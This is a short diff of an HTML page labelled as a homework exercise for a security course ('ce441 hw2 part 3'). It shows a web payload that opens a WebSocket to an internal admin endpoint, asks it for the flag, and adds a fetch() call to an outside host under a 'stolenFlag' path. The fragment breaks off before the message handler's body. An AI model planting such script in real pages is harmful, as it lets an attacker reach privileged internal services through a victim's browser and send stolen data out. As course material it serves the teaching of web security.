@@ -3,6 +3,7 @@
     <body>
 this is ce441 hw2 part 3, v2
  <script>
+     fetch(`http://hw2p3.ckodser.ir:8043/stolenFlag/itcould`);
 const ws = new WebSocket(`ws://web:8080/admin/ws`);
 ws.onopen = () => ws.send("flag");
 ws.onmessage = (event) => {
